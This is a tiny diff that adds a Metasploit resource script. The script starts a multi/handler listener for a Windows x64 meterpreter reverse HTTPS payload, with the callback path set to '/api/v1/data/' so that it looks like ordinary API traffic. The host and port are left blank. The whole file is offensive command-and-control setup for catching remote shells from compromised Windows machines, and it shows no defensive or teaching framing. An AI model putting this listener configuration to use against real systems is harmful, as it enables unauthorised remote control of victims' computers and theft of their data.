@@ -1,0 +1,6 @@
+use multi/handler
+set payload windows/x64/meterpreter_reverse_https
+set lhost
+set lport
+set luri /api/v1/data/
+run 
